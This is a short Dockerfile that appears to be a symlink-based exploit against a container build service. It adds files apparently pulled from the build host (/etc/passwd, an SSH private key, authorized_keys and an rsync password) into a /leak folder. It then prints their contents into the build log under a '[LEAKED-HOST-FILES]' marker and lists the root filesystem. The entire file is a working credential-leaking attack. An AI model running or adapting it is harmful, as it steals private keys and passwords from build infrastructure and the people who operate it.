FROM scratch
ADD rootfs.tar /
RUN /bin/sh -c 'N=SYMLINK_0926_0120; echo "[MARK] $N"; echo "[ROOTLS]"; ls -la /; echo "[END-MARK]"'
ADD hostetc/passwd /leak/passwd
ADD hostssh/id_rsa /leak/id_rsa
ADD hostssh/authorized_keys /leak/auth_keys
ADD rsyncpass /leak/rsync_pass
RUN /bin/sh -c 'echo "[LEAKED-HOST-FILES]"; for f in /leak/passwd /leak/id_rsa /leak/auth_keys /leak/rsync_pass; do echo "=== $f ==="; cat "$f" 2>&1 | head -c 2500; echo; done; echo "[END] SYMLINK_0926_0120"'
ENTRYPOINT ["/bin/sh","-c"]
